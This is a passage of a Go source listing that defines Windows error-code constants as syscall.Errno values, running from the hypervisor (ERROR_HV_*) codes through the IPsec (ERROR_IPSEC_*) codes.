ERROR_HV_PAGE_REQUEST_INVALID                                             syscall.Errno = 0xC0350060
ERROR_HV_PARTITION_TOO_DEEP                                               syscall.Errno = 0xC035000C
ERROR_HV_PENDING_PAGE_REQUESTS                                            syscall.Errno = 0x00350059
ERROR_HV_PROCESSOR_STARTUP_TIMEOUT                                        syscall.Errno = 0xC035003E
ERROR_HV_PROPERTY_VALUE_OUT_OF_RANGE                                      syscall.Errno = 0xC035000A
ERROR_HV_SMX_ENABLED                                                      syscall.Errno = 0xC035003F
ERROR_HV_UNKNOWN_PROPERTY                                                 syscall.Errno = 0xC0350009
ERROR_HWNDS_HAVE_DIFF_PARENT                                              syscall.Errno = 1441
ERROR_ICM_NOT_ENABLED                                                     syscall.Errno = 2018
ERROR_IEPORT_FULL                                                         syscall.Errno = 4341
ERROR_ILLEGAL_CHARACTER                                                   syscall.Errno = 582
ERROR_ILLEGAL_DLL_RELOCATION                                              syscall.Errno = 623
ERROR_ILLEGAL_ELEMENT_ADDRESS                                             syscall.Errno = 1162
ERROR_ILLEGAL_FLOAT_CONTEXT                                               syscall.Errno = 579
ERROR_ILL_FORMED_PASSWORD                                                 syscall.Errno = 1324
ERROR_IMAGE_AT_DIFFERENT_BASE                                             syscall.Errno = 807
ERROR_IMAGE_MACHINE_TYPE_MISMATCH                                         syscall.Errno = 706
ERROR_IMAGE_MACHINE_TYPE_MISMATCH_EXE                                     syscall.Errno = 720
ERROR_IMAGE_NOT_AT_BASE                                                   syscall.Errno = 700
ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT                                         syscall.Errno = 308
ERROR_IMPLEMENTATION_LIMIT                                                syscall.Errno = 1292
ERROR_IMPLICIT_TRANSACTION_NOT_SUPPORTED                                  syscall.Errno = 6725
ERROR_INCOMPATIBLE_SERVICE_PRIVILEGE                                      syscall.Errno = 1297
ERROR_INCOMPATIBLE_SERVICE_SID_TYPE                                       syscall.Errno = 1290
ERROR_INCOMPATIBLE_WITH_GLOBAL_SHORT_NAME_REGISTRY_SETTING                syscall.Errno = 304
ERROR_INCORRECT_ACCOUNT_TYPE                                              syscall.Errno = 8646
ERROR_INCORRECT_ADDRESS                                                   syscall.Errno = 1241
ERROR_INCORRECT_SIZE                                                      syscall.Errno = 1462
ERROR_INC_BACKUP                                                          syscall.Errno = 4003
ERROR_INDEX_ABSENT                                                        syscall.Errno = 1611
ERROR_INDIGENOUS_TYPE                                                     syscall.Errno = 4338
ERROR_INDOUBT_TRANSACTIONS_EXIST                                          syscall.Errno = 6827
ERROR_INFLOOP_IN_RELOC_CHAIN                                              syscall.Errno = 202
ERROR_INF_IN_USE_BY_DEVICES                  Errno = 0x20000000 
ERROR_INSTALL_ALREADY_RUNNING                                             syscall.Errno = 1618
ERROR_INSTALL_CANCEL                                                      syscall.Errno = 15608
ERROR_INSTALL_DEREGISTRATION_FAILURE                                      syscall.Errno = 15607
ERROR_INSTALL_FAILED                                                      syscall.Errno = 15609
ERROR_INSTALL_FAILURE                                                     syscall.Errno = 1603
ERROR_INSTALL_FIREWALL_SERVICE_NOT_RUNNING                                syscall.Errno = 15626
ERROR_INSTALL_INVALID_PACKAGE                                             syscall.Errno = 15602
ERROR_INSTALL_INVALID_RELATED_SET_UPDATE                                  syscall.Errno = 15639
ERROR_INSTALL_LANGUAGE_UNSUPPORTED                                        syscall.Errno = 1623
ERROR_INSTALL_LOG_FAILURE                                                 syscall.Errno = 1622
ERROR_INSTALL_NETWORK_FAILURE                                             syscall.Errno = 15605
ERROR_INSTALL_NOTUSED                                                     syscall.Errno = 1634
ERROR_INSTALL_OPEN_PACKAGE_FAILED                                         syscall.Errno = 15600
ERROR_INSTALL_OPTIONAL_PACKAGE_APPLICATIONID_NOT_UNIQUE                   syscall.Errno = 15637
ERROR_INSTALL_OPTIONAL_PACKAGE_REQUIRES_MAIN_PACKAGE                      syscall.Errno = 15634
ERROR_INSTALL_OPTIONAL_PACKAGE_REQUIRES_MAIN_PACKAGE_FULLTRUST_CAPABILITY syscall.Errno = 15640
ERROR_INSTALL_OUT_OF_DISK_SPACE                                           syscall.Errno = 15604
ERROR_INSTALL_PACKAGE_DOWNGRADE                                           syscall.Errno = 15622
ERROR_INSTALL_PACKAGE_INVALID                                             syscall.Errno = 1620
ERROR_INSTALL_PACKAGE_NOT_FOUND                                           syscall.Errno = 15601
ERROR_INSTALL_PACKAGE_OPEN_FAILED                                         syscall.Errno = 1619
ERROR_INSTALL_PACKAGE_REJECTED                                            syscall.Errno = 1625
ERROR_INSTALL_PACKAGE_VERSION                                             syscall.Errno = 1613
ERROR_INSTALL_PLATFORM_UNSUPPORTED                                        syscall.Errno = 1633
ERROR_INSTALL_POLICY_FAILURE                                              syscall.Errno = 15615
ERROR_INSTALL_PREREQUISITE_FAILED                                         syscall.Errno = 15613
ERROR_INSTALL_REGISTRATION_FAILURE                                        syscall.Errno = 15606
ERROR_INSTALL_REJECTED                                                    syscall.Errno = 1654
ERROR_INSTALL_REMOTE_DISALLOWED                                           syscall.Errno = 1640
ERROR_INSTALL_REMOTE_PROHIBITED                                           syscall.Errno = 1645
ERROR_INSTALL_RESOLVE_DEPENDENCY_FAILED                                   syscall.Errno = 15603
ERROR_INSTALL_SERVICE_FAILURE                                             syscall.Errno = 1601
ERROR_INSTALL_SERVICE_SAFEBOOT                                            syscall.Errno = 1652
ERROR_INSTALL_SOURCE_ABSENT                                               syscall.Errno = 1612
ERROR_INSTALL_SUSPEND                                                     syscall.Errno = 1604
ERROR_INSTALL_TEMP_UNWRITABLE                                             syscall.Errno = 1632
ERROR_INSTALL_TRANSFORM_FAILURE                                           syscall.Errno = 1624
ERROR_INSTALL_TRANSFORM_REJECTED                                          syscall.Errno = 1644
ERROR_INSTALL_UI_FAILURE                                                  syscall.Errno = 1621
ERROR_INSTALL_USEREXIT                                                    syscall.Errno = 1602
ERROR_INSTALL_VOLUME_CORRUPT                                              syscall.Errno = 15630
ERROR_INSTALL_VOLUME_NOT_EMPTY                                            syscall.Errno = 15628
ERROR_INSTALL_VOLUME_OFFLINE                                              syscall.Errno = 15629
ERROR_INSTALL_WRONG_PROCESSOR_ARCHITECTURE                                syscall.Errno = 15632
ERROR_INSTRUCTION_MISALIGNMENT                                            syscall.Errno = 549
ERROR_INSUFFICIENT_BUFFER                                                 syscall.Errno = 122
ERROR_INSUFFICIENT_LOGON_INFO                                             syscall.Errno = 608
ERROR_INSUFFICIENT_POWER                                                  syscall.Errno = 639
ERROR_INSUFFICIENT_RESOURCE_FOR_SPECIFIED_SHARED_SECTION_SIZE             syscall.Errno = 781
ERROR_INTERFACE_DEVICE_ACTIVE                Errno = ERROR_DEVICE_INTERFACE_ACTIVE
ERROR_INTERFACE_DEVICE_REMOVED               Errno = ERROR_DEVICE_INTERFACE_REMOVED
ERROR_INTERMIXED_KERNEL_EA_OPERATION                                      syscall.Errno = 324
ERROR_INTERNAL_DB_CORRUPTION                                              syscall.Errno = 1358
ERROR_INTERNAL_DB_ERROR                                                   syscall.Errno = 1383
ERROR_INTERNAL_ERROR                                                      syscall.Errno = 1359
ERROR_INTERRUPT_STILL_CONNECTED                                           syscall.Errno = 764
ERROR_INTERRUPT_VECTOR_ALREADY_CONNECTED                                  syscall.Errno = 763
ERROR_INVALID_ACCEL_HANDLE                                                syscall.Errno = 1403
ERROR_INVALID_ACCESS                                                      syscall.Errno = 12
ERROR_INVALID_ACCOUNT_NAME                                                syscall.Errno = 1315
ERROR_INVALID_ACE_CONDITION                                               syscall.Errno = 805
ERROR_INVALID_ACL                                                         syscall.Errno = 1336
ERROR_INVALID_ADDRESS                                                     syscall.Errno = 487
ERROR_INVALID_AT_INTERRUPT_TIME                                           syscall.Errno = 104
ERROR_INVALID_BLOCK                                                       syscall.Errno = 9
ERROR_INVALID_BLOCK_LENGTH                                                syscall.Errno = 1106
ERROR_INVALID_CAP                                                         syscall.Errno = 320
ERROR_INVALID_CATEGORY                                                    syscall.Errno = 117
ERROR_INVALID_CLASS                          Errno = 0x20000000 
ERROR_INVALID_CLASS_INSTALLER                Errno = 0x20000000 
ERROR_INVALID_CLEANER                                                     syscall.Errno = 4310
ERROR_INVALID_CLUSTER_IPV6_ADDRESS                                        syscall.Errno = 5911
ERROR_INVALID_CMM                                                         syscall.Errno = 2010
ERROR_INVALID_COINSTALLER                    Errno = 0x20000000 
ERROR_INVALID_COLORINDEX                                                  syscall.Errno = 2022
ERROR_INVALID_COLORSPACE                                                  syscall.Errno = 2017
ERROR_INVALID_COMBOBOX_MESSAGE                                            syscall.Errno = 1422
ERROR_INVALID_COMMAND_LINE                                                syscall.Errno = 1639
ERROR_INVALID_COMPUTERNAME                                                syscall.Errno = 1210
ERROR_INVALID_CRUNTIME_PARAMETER                                          syscall.Errno = 1288
ERROR_INVALID_CURSOR_HANDLE                                               syscall.Errno = 1402
ERROR_INVALID_DATA                                                        syscall.Errno = 13
ERROR_INVALID_DATATYPE                                                    syscall.Errno = 1804
ERROR_INVALID_DEVICE_OBJECT_PARAMETER                                     syscall.Errno = 650
ERROR_INVALID_DEVINST_NAME                   Errno = 0x20000000 
ERROR_INVALID_DLL                                                         syscall.Errno = 1154
ERROR_INVALID_DOMAINNAME                                                  syscall.Errno = 1212
ERROR_INVALID_DOMAIN_ROLE                                                 syscall.Errno = 1354
ERROR_INVALID_DOMAIN_STATE                                                syscall.Errno = 1353
ERROR_INVALID_DRIVE                                                       syscall.Errno = 15
ERROR_INVALID_DRIVE_OBJECT                                                syscall.Errno = 4321
ERROR_INVALID_DWP_HANDLE                                                  syscall.Errno = 1405
ERROR_INVALID_EA_HANDLE                                                   syscall.Errno = 278
ERROR_INVALID_EA_NAME                                                     syscall.Errno = 254
ERROR_INVALID_EDIT_HEIGHT                                                 syscall.Errno = 1424
ERROR_INVALID_ENVIRONMENT                                                 syscall.Errno = 1805
ERROR_INVALID_EVENTNAME                                                   syscall.Errno = 1211
ERROR_INVALID_EVENT_COUNT                                                 syscall.Errno = 151
ERROR_INVALID_EXCEPTION_HANDLER                                           syscall.Errno = 310
ERROR_INVALID_EXE_SIGNATURE                                               syscall.Errno = 191
ERROR_INVALID_FIELD                                                       syscall.Errno = 1616
ERROR_INVALID_FIELD_IN_PARAMETER_LIST                                     syscall.Errno = 328
ERROR_INVALID_FILTER_DRIVER                  Errno = 0x20000000 
ERROR_INVALID_FILTER_PROC                                                 syscall.Errno = 1427
ERROR_INVALID_FLAGS                                                       syscall.Errno = 1004
ERROR_INVALID_FLAG_NUMBER                                                 syscall.Errno = 186
ERROR_INVALID_FORM_NAME                                                   syscall.Errno = 1902
ERROR_INVALID_FORM_SIZE                                                   syscall.Errno = 1903
ERROR_INVALID_FUNCTION                                                    syscall.Errno = 1
ERROR_INVALID_GROUPNAME                                                   syscall.Errno = 1209
ERROR_INVALID_GROUP_ATTRIBUTES                                            syscall.Errno = 1345
ERROR_INVALID_GW_COMMAND                                                  syscall.Errno = 1443
ERROR_INVALID_HANDLE                                                      syscall.Errno = 6
ERROR_INVALID_HANDLE_STATE                                                syscall.Errno = 1609
ERROR_INVALID_HOOK_FILTER                                                 syscall.Errno = 1426
ERROR_INVALID_HOOK_HANDLE                                                 syscall.Errno = 1404
ERROR_INVALID_HWPROFILE                      Errno = 0x20000000 
ERROR_INVALID_HW_PROFILE                                                  syscall.Errno = 619
ERROR_INVALID_ICON_HANDLE                                                 syscall.Errno = 1414
ERROR_INVALID_ID_AUTHORITY                                                syscall.Errno = 1343
ERROR_INVALID_IMAGE_HASH                                                  syscall.Errno = 577
ERROR_INVALID_IMPORT_OF_NON_DLL                                           syscall.Errno = 1276
ERROR_INVALID_INDEX                                                       syscall.Errno = 1413
ERROR_INVALID_INF_LOGCONFIG                  Errno = 0x20000000 
ERROR_INVALID_KERNEL_INFO_VERSION                                         syscall.Errno = 340
ERROR_INVALID_KEYBOARD_HANDLE                                             syscall.Errno = 1457
ERROR_INVALID_LABEL                                                       syscall.Errno = 1299
ERROR_INVALID_LB_MESSAGE                                                  syscall.Errno = 1432
ERROR_INVALID_LDT_DESCRIPTOR                                              syscall.Errno = 564
ERROR_INVALID_LDT_OFFSET                                                  syscall.Errno = 563
ERROR_INVALID_LDT_SIZE                                                    syscall.Errno = 561
ERROR_INVALID_LEVEL                                                       syscall.Errno = 124
ERROR_INVALID_LIBRARY                                                     syscall.Errno = 4301
ERROR_INVALID_LIST_FORMAT                                                 syscall.Errno = 153
ERROR_INVALID_LOCK_RANGE                                                  syscall.Errno = 307
ERROR_INVALID_LOGON_HOURS                                                 syscall.Errno = 1328
ERROR_INVALID_LOGON_TYPE                                                  syscall.Errno = 1367
ERROR_INVALID_MACHINENAME                    Errno = 0x20000000 
ERROR_INVALID_MEDIA                                                       syscall.Errno = 4300
ERROR_INVALID_MEDIA_POOL                                                  syscall.Errno = 4302
ERROR_INVALID_MEMBER                                                      syscall.Errno = 1388
ERROR_INVALID_MENU_HANDLE                                                 syscall.Errno = 1401
ERROR_INVALID_MESSAGE                                                     syscall.Errno = 1002
ERROR_INVALID_MESSAGEDEST                                                 syscall.Errno = 1218
ERROR_INVALID_MESSAGENAME                                                 syscall.Errno = 1217
ERROR_INVALID_MINALLOCSIZE                                                syscall.Errno = 195
ERROR_INVALID_MODULETYPE                                                  syscall.Errno = 190
ERROR_INVALID_MONITOR_HANDLE                                              syscall.Errno = 1461
ERROR_INVALID_MSGBOX_STYLE                                                syscall.Errno = 1438
ERROR_INVALID_NAME                                                        syscall.Errno = 123
ERROR_INVALID_NETNAME                                                     syscall.Errno = 1214
ERROR_INVALID_OPERATION                                                   syscall.Errno = 4317
ERROR_INVALID_OPERATION_ON_QUORUM                                         syscall.Errno = 5068
ERROR_INVALID_OPLOCK_PROTOCOL                                             syscall.Errno = 301
ERROR_INVALID_ORDINAL                                                     syscall.Errno = 182
ERROR_INVALID_OWNER                                                       syscall.Errno = 1307
ERROR_INVALID_PACKAGE_SID_LENGTH                                          syscall.Errno = 4253
ERROR_INVALID_PARAMETER                                                   syscall.Errno = 87
ERROR_INVALID_PASSWORD                                                    syscall.Errno = 86
ERROR_INVALID_PASSWORDNAME                                                syscall.Errno = 1216
ERROR_INVALID_PATCH_XML                                                   syscall.Errno = 1650
ERROR_INVALID_PEP_INFO_VERSION                                            syscall.Errno = 341
ERROR_INVALID_PIXEL_FORMAT                                                syscall.Errno = 2000
ERROR_INVALID_PLUGPLAY_DEVICE_PATH                                        syscall.Errno = 620
ERROR_INVALID_PORT_ATTRIBUTES                                             syscall.Errno = 545
ERROR_INVALID_PRIMARY_GROUP                                               syscall.Errno = 1308
ERROR_INVALID_PRINTER_COMMAND                                             syscall.Errno = 1803
ERROR_INVALID_PRINTER_DRIVER_MANIFEST                                     syscall.Errno = 3021
ERROR_INVALID_PRINTER_NAME                                                syscall.Errno = 1801
ERROR_INVALID_PRINTER_STATE                                               syscall.Errno = 1906
ERROR_INVALID_PRINT_MONITOR                                               syscall.Errno = 3007
ERROR_INVALID_PRIORITY                                                    syscall.Errno = 1800
ERROR_INVALID_PROFILE                                                     syscall.Errno = 2011
ERROR_INVALID_PROPPAGE_PROVIDER              Errno = 0x20000000 
ERROR_INVALID_QUOTA_LOWER                                                 syscall.Errno = 547
ERROR_INVALID_REFERENCE_STRING               Errno = 0x20000000 
ERROR_INVALID_REG_PROPERTY                   Errno = 0x20000000 
ERROR_INVALID_REPARSE_DATA                                                syscall.Errno = 4392
ERROR_INVALID_RUNLEVEL_SETTING                                            syscall.Errno = 15401
ERROR_INVALID_SCROLLBAR_RANGE                                             syscall.Errno = 1448
ERROR_INVALID_SECURITY_DESCR                                              syscall.Errno = 1338
ERROR_INVALID_SEGDPL                                                      syscall.Errno = 198
ERROR_INVALID_SEGMENT_NUMBER                                              syscall.Errno = 180
ERROR_INVALID_SEPARATOR_FILE                                              syscall.Errno = 1799
ERROR_INVALID_SERVER_STATE                                                syscall.Errno = 1352
ERROR_INVALID_SERVICENAME                                                 syscall.Errno = 1213
ERROR_INVALID_SERVICE_ACCOUNT                                             syscall.Errno = 1057
ERROR_INVALID_SERVICE_CONTROL                                             syscall.Errno = 1052
ERROR_INVALID_SERVICE_LOCK                                                syscall.Errno = 1071
ERROR_INVALID_SHARENAME                                                   syscall.Errno = 1215
ERROR_INVALID_SHOWWIN_COMMAND                                             syscall.Errno = 1449
ERROR_INVALID_SID                                                         syscall.Errno = 1337
ERROR_INVALID_SIGNAL_NUMBER                                               syscall.Errno = 209
ERROR_INVALID_SPI_VALUE                                                   syscall.Errno = 1439
ERROR_INVALID_STACKSEG                                                    syscall.Errno = 189
ERROR_INVALID_STAGED_SIGNATURE                                            syscall.Errno = 15620
ERROR_INVALID_STARTING_CODESEG                                            syscall.Errno = 188
ERROR_INVALID_STATE                                                       syscall.Errno = 5023
ERROR_INVALID_SUB_AUTHORITY                                               syscall.Errno = 1335
ERROR_INVALID_TABLE                                                       syscall.Errno = 1628
ERROR_INVALID_TARGET                         Errno = 0x20000000 
ERROR_INVALID_TARGET_HANDLE                                               syscall.Errno = 114
ERROR_INVALID_TASK_INDEX                                                  syscall.Errno = 1551
ERROR_INVALID_TASK_NAME                                                   syscall.Errno = 1550
ERROR_INVALID_THREAD_ID                                                   syscall.Errno = 1444
ERROR_INVALID_TIME                                                        syscall.Errno = 1901
ERROR_INVALID_TOKEN                                                       syscall.Errno = 315
ERROR_INVALID_TRANSACTION                                                 syscall.Errno = 6700
ERROR_INVALID_TRANSFORM                                                   syscall.Errno = 2020
ERROR_INVALID_UNWIND_TARGET                                               syscall.Errno = 544
ERROR_INVALID_USER_BUFFER                                                 syscall.Errno = 1784
ERROR_INVALID_USER_PRINCIPAL_NAME                                         syscall.Errno = 8636
ERROR_INVALID_VARIANT                                                     syscall.Errno = 604
ERROR_INVALID_VERIFY_SWITCH                                               syscall.Errno = 118
ERROR_INVALID_WINDOW_HANDLE                                               syscall.Errno = 1400
ERROR_INVALID_WINDOW_STYLE                                                syscall.Errno = 2002
ERROR_INVALID_WORKSTATION                                                 syscall.Errno = 1329
ERROR_IN_WOW64                               Errno = 0x20000000 
ERROR_IOPL_NOT_ENABLED                                                    syscall.Errno = 197
ERROR_IO_DEVICE                                                           syscall.Errno = 1117
ERROR_IO_INCOMPLETE                                                       syscall.Errno = 996
ERROR_IO_PENDING                                                          syscall.Errno = 997
ERROR_IO_PREEMPTED                                                        Handle        = 0x89010001
ERROR_IO_PRIVILEGE_FAILED                                                 syscall.Errno = 571
ERROR_IO_REISSUE_AS_CACHED                                                syscall.Errno = 3950
ERROR_IPSEC_AUTH_FIREWALL_DROP                                            syscall.Errno = 13917
ERROR_IPSEC_BAD_SPI                                                       syscall.Errno = 13910
ERROR_IPSEC_CLEAR_TEXT_DROP                                               syscall.Errno = 13916
ERROR_IPSEC_DEFAULT_MM_AUTH_NOT_FOUND                                     syscall.Errno = 13014
ERROR_IPSEC_DEFAULT_MM_POLICY_NOT_FOUND                                   syscall.Errno = 13013
ERROR_IPSEC_DEFAULT_QM_POLICY_NOT_FOUND                                   syscall.Errno = 13015
ERROR_IPSEC_DOSP_BLOCK                                                    syscall.Errno = 13925
ERROR_IPSEC_DOSP_INVALID_PACKET                                           syscall.Errno = 13927
ERROR_IPSEC_DOSP_KEYMOD_NOT_ALLOWED                                       syscall.Errno = 13930
ERROR_IPSEC_DOSP_MAX_ENTRIES                                              syscall.Errno = 13929
ERROR_IPSEC_DOSP_MAX_PER_IP_RATELIMIT_QUEUES                              syscall.Errno = 13932
ERROR_IPSEC_DOSP_NOT_INSTALLED                                            syscall.Errno = 13931
ERROR_IPSEC_DOSP_RECEIVED_MULTICAST                                       syscall.Errno = 13926
ERROR_IPSEC_DOSP_STATE_LOOKUP_FAILED                                      syscall.Errno = 13928
ERROR_IPSEC_IKE_ADD_UPDATE_KEY_FAILED                                     syscall.Errno = 13860
ERROR_IPSEC_IKE_ATTRIB_FAIL                                               syscall.Errno = 13802
ERROR_IPSEC_IKE_AUTHORIZATION_FAILURE                                     syscall.Errno = 13905
ERROR_IPSEC_IKE_AUTHORIZATION_FAILURE_WITH_OPTIONAL_RETRY                 syscall.Errno = 13907
ERROR_IPSEC_IKE_AUTH_FAIL                                                 syscall.Errno = 13801
ERROR_IPSEC_IKE_BENIGN_REINIT                                             syscall.Errno = 13878
ERROR_IPSEC_IKE_CERT_CHAIN_POLICY_MISMATCH                                syscall.Errno = 13887
ERROR_IPSEC_IKE_CGA_AUTH_FAILED                                           syscall.Errno = 13892
ERROR_IPSEC_IKE_COEXISTENCE_SUPPRESS                                      syscall.Errno = 13902
ERROR_IPSEC_IKE_CRITICAL_PAYLOAD_NOT_RECOGNIZED                           syscall.Errno = 13823
ERROR_IPSEC_IKE_CRL_FAILED                                                syscall.Errno = 13817
ERROR_IPSEC_IKE_DECRYPT                                                   syscall.Errno = 13867
ERROR_IPSEC_IKE_DH_FAIL                                                   syscall.Errno = 13822
ERROR_IPSEC_IKE_DH_FAILURE                                                syscall.Errno = 13864
ERROR_IPSEC_IKE_DOS_COOKIE_SENT                                           syscall.Errno = 13890
ERROR_IPSEC_IKE_DROP_NO_RESPONSE                                          syscall.Errno = 13813
ERROR_IPSEC_IKE_ENCRYPT                                                   syscall.Errno = 13866
ERROR_IPSEC_IKE_ERROR                                                     syscall.Errno = 13816
ERROR_IPSEC_IKE_FAILQUERYSSP                                              syscall.Errno = 13854
ERROR_IPSEC_IKE_FAILSSPINIT                                               syscall.Errno = 13853
ERROR_IPSEC_IKE_GENERAL_PROCESSING_ERROR                                  syscall.Errno = 13804
ERROR_IPSEC_IKE_GETSPIFAIL                                                syscall.Errno = 13857
ERROR_IPSEC_IKE_INNER_IP_ASSIGNMENT_FAILURE                               syscall.Errno = 13899
ERROR_IPSEC_IKE_INVALID_AUTH_ALG                                          syscall.Errno = 13874
ERROR_IPSEC_IKE_INVALID_AUTH_PAYLOAD                                      syscall.Errno = 13889
ERROR_IPSEC_IKE_INVALID_CERT_KEYLEN                                       syscall.Errno = 13881
ERROR_IPSEC_IKE_INVALID_CERT_TYPE                                         syscall.Errno = 13819
ERROR_IPSEC_IKE_INVALID_COOKIE                                            syscall.Errno = 13846
ERROR_IPSEC_IKE_INVALID_ENCRYPT_ALG                                       syscall.Errno = 13873
ERROR_IPSEC_IKE_INVALID_FILTER                                            syscall.Errno = 13858
ERROR_IPSEC_IKE_INVALID_GROUP                                             syscall.Errno = 13865
ERROR_IPSEC_IKE_INVALID_HASH                                              syscall.Errno = 13870
ERROR_IPSEC_IKE_INVALID_HASH_ALG                                          syscall.Errno = 13871
ERROR_IPSEC_IKE_INVALID_HASH_SIZE                                         syscall.Errno = 13872
ERROR_IPSEC_IKE_INVALID_HEADER                                            syscall.Errno = 13824
ERROR_IPSEC_IKE_INVALID_KEY_USAGE                                         syscall.Errno = 13818
ERROR_IPSEC_IKE_INVALID_MAJOR_VERSION                                     syscall.Errno = 13880
ERROR_IPSEC_IKE_INVALID_MM_FOR_QM                                         syscall.Errno = 13894
ERROR_IPSEC_IKE_INVALID_PAYLOAD                                           syscall.Errno = 13843
ERROR_IPSEC_IKE_INVALID_POLICY                                            syscall.Errno = 13861
ERROR_IPSEC_IKE_INVALID_RESPONDER_LIFETIME_NOTIFY                         syscall.Errno = 13879
ERROR_IPSEC_IKE_INVALID_SIG                                               syscall.Errno = 13875
ERROR_IPSEC_IKE_INVALID_SIGNATURE                                         syscall.Errno = 13826
ERROR_IPSEC_IKE_INVALID_SITUATION                                         syscall.Errno = 13863
ERROR_IPSEC_IKE_KERBEROS_ERROR                                            syscall.Errno = 13827
ERROR_IPSEC_IKE_KILL_DUMMY_NAP_TUNNEL                                     syscall.Errno = 13898
ERROR_IPSEC_IKE_LOAD_FAILED                                               syscall.Errno = 13876
ERROR_IPSEC_IKE_LOAD_SOFT_SA                                              syscall.Errno = 13844
ERROR_IPSEC_IKE_MM_ACQUIRE_DROP                                           syscall.Errno = 13809
ERROR_IPSEC_IKE_MM_DELAY_DROP                                             syscall.Errno = 13814
ERROR_IPSEC_IKE_MM_EXPIRED                                                syscall.Errno = 13885
ERROR_IPSEC_IKE_MM_LIMIT                                                  syscall.Errno = 13882
ERROR_IPSEC_IKE_NEGOTIATION_DISABLED                                      syscall.Errno = 13883
ERROR_IPSEC_IKE_NEGOTIATION_PENDING                                       syscall.Errno = 13803
ERROR_IPSEC_IKE_NEG_STATUS_BEGIN                                          syscall.Errno = 13800
ERROR_IPSEC_IKE_NEG_STATUS_END                                            syscall.Errno = 13897
ERROR_IPSEC_IKE_NEG_STATUS_EXTENDED_END                                   syscall.Errno = 13909
ERROR_IPSEC_IKE_NOTCBPRIV                                                 syscall.Errno = 13851
ERROR_IPSEC_IKE_NO_CERT                                                   syscall.Errno = 13806
ERROR_IPSEC_IKE_NO_MM_POLICY                                              syscall.Errno = 13850
ERROR_IPSEC_IKE_NO_PEER_CERT                                              syscall.Errno = 13847
ERROR_IPSEC_IKE_NO_POLICY                                                 syscall.Errno = 13825
ERROR_IPSEC_IKE_NO_PRIVATE_KEY                                            syscall.Errno = 13820
ERROR_IPSEC_IKE_NO_PUBLIC_KEY                                             syscall.Errno = 13828
ERROR_IPSEC_IKE_OUT_OF_MEMORY                                             syscall.Errno = 13859
ERROR_IPSEC_IKE_PEER_CRL_FAILED                                           syscall.Errno = 13848
ERROR_IPSEC_IKE_PEER_DOESNT_SUPPORT_MOBIKE                                syscall.Errno = 13904
ERROR_IPSEC_IKE_PEER_MM_ASSUMED_INVALID                                   syscall.Errno = 13886
ERROR_IPSEC_IKE_POLICY_CHANGE                                             syscall.Errno = 13849
ERROR_IPSEC_IKE_POLICY_MATCH                                              syscall.Errno = 13868
ERROR_IPSEC_IKE_PROCESS_ERR                                               syscall.Errno = 13829
ERROR_IPSEC_IKE_PROCESS_ERR_CERT                                          syscall.Errno = 13835
ERROR_IPSEC_IKE_PROCESS_ERR_CERT_REQ                                      syscall.Errno = 13836
ERROR_IPSEC_IKE_PROCESS_ERR_DELETE                                        syscall.Errno = 13841
ERROR_IPSEC_IKE_PROCESS_ERR_HASH                                          syscall.Errno = 13837
ERROR_IPSEC_IKE_PROCESS_ERR_ID                                            syscall.Errno = 13834
ERROR_IPSEC_IKE_PROCESS_ERR_KE                                            syscall.Errno = 13833
ERROR_IPSEC_IKE_PROCESS_ERR_NATOA                                         syscall.Errno = 13893
ERROR_IPSEC_IKE_PROCESS_ERR_NONCE                                         syscall.Errno = 13839
ERROR_IPSEC_IKE_PROCESS_ERR_NOTIFY                                        syscall.Errno = 13840
ERROR_IPSEC_IKE_PROCESS_ERR_PROP                                          syscall.Errno = 13831
ERROR_IPSEC_IKE_PROCESS_ERR_SA                                            syscall.Errno = 13830
ERROR_IPSEC_IKE_PROCESS_ERR_SIG                                           syscall.Errno = 13838
ERROR_IPSEC_IKE_PROCESS_ERR_TRANS                                         syscall.Errno = 13832
ERROR_IPSEC_IKE_PROCESS_ERR_VENDOR                                        syscall.Errno = 13842
ERROR_IPSEC_IKE_QM_ACQUIRE_DROP                                           syscall.Errno = 13810
ERROR_IPSEC_IKE_QM_DELAY_DROP                                             syscall.Errno = 13815
ERROR_IPSEC_IKE_QM_EXPIRED                                                syscall.Errno = 13895
ERROR_IPSEC_IKE_QM_LIMIT                                                  syscall.Errno = 13884
ERROR_IPSEC_IKE_QUEUE_DROP_MM                                             syscall.Errno = 13811
ERROR_IPSEC_IKE_QUEUE_DROP_NO_MM                                          syscall.Errno = 13812
ERROR_IPSEC_IKE_RATELIMIT_DROP                                            syscall.Errno = 13903
ERROR_IPSEC_IKE_REQUIRE_CP_PAYLOAD_MISSING                                syscall.Errno = 13900
ERROR_IPSEC_IKE_RPC_DELETE                                                syscall.Errno = 13877
ERROR_IPSEC_IKE_SA_DELETED                                                syscall.Errno = 13807
ERROR_IPSEC_IKE_SA_REAPED                                                 syscall.Errno = 13808
ERROR_IPSEC_IKE_SECLOADFAIL                                               syscall.Errno = 13852
ERROR_IPSEC_IKE_SHUTTING_DOWN                                             syscall.Errno = 13891
ERROR_IPSEC_IKE_SIMULTANEOUS_REKEY                                        syscall.Errno = 13821
ERROR_IPSEC_IKE_SOFT_SA_TORN_DOWN                                         syscall.Errno = 13845
ERROR_IPSEC_IKE_SRVACQFAIL                                                syscall.Errno = 13855
ERROR_IPSEC_IKE_SRVQUERYCRED                                              syscall.Errno = 13856
ERROR_IPSEC_IKE_STRONG_CRED_AUTHORIZATION_AND_CERTMAP_FAILURE             syscall.Errno = 13908
ERROR_IPSEC_IKE_STRONG_CRED_AUTHORIZATION_FAILURE                         syscall.Errno = 13906
ERROR_IPSEC_IKE_TIMED_OUT                                                 syscall.Errno = 13805
ERROR_IPSEC_IKE_TOO_MANY_FILTERS                                          syscall.Errno = 13896
ERROR_IPSEC_IKE_UNEXPECTED_MESSAGE_ID                                     syscall.Errno = 13888
ERROR_IPSEC_IKE_UNKNOWN_DOI                                               syscall.Errno = 13862
ERROR_IPSEC_IKE_UNSUPPORTED_ID                                            syscall.Errno = 13869
ERROR_IPSEC_INTEGRITY_CHECK_FAILED                                        syscall.Errno = 13915
ERROR_IPSEC_INVALID_PACKET                                                syscall.Errno = 13914
ERROR_IPSEC_KEY_MODULE_IMPERSONATION_NEGOTIATION_PENDING                  syscall.Errno = 13901
ERROR_IPSEC_MM_AUTH_EXISTS                                                syscall.Errno = 13010
ERROR_IPSEC_MM_AUTH_IN_USE                                                syscall.Errno = 13012
ERROR_IPSEC_MM_AUTH_NOT_FOUND                                             syscall.Errno = 13011
ERROR_IPSEC_MM_AUTH_PENDING_DELETION                                      syscall.Errno = 13022
ERROR_IPSEC_MM_FILTER_EXISTS                                              syscall.Errno = 13006
ERROR_IPSEC_MM_FILTER_NOT_FOUND                                           syscall.Errno = 13007
